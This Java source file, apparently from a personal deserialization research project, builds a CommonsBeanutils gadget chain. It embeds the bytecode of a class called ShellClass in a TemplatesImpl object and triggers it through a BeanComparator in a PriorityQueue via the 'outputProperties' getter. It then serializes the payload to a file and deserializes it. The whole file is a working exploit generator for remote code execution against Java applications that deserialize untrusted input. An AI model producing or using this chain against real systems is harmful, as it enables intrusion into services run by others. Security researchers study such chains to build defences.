package Seri.CBGadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

import static Seri.Utils.*;

public class CBObjectToStringComparator {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Files.readAllBytes(Paths.get("/Users/y1shin/IdeaProjects/Seri/target/classes/Seri/ShellClass.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name","aaa");
        setValue(templates,"_bytecodes",new byte[][]{bytes});
        setValue(templates,"_tfactory",new TransformerFactoryImpl());

        ObjectToStringComparator objectToStringComparator = new ObjectToStringComparator();
        BeanComparator beanComparator = new BeanComparator(null ,objectToStringComparator);

        PriorityQueue queue = new PriorityQueue(2,beanComparator);
        queue.add(objectToStringComparator);
        queue.add(objectToStringComparator);

        setValue(queue,"queue",new Object[]{templates,templates});
        setValue(beanComparator ,"property" ,"outputProperties");

        serialize(queue ,"bin/CBOTSC.bin");
        unserialize("bin/CBOTSC.bin");

    }
}
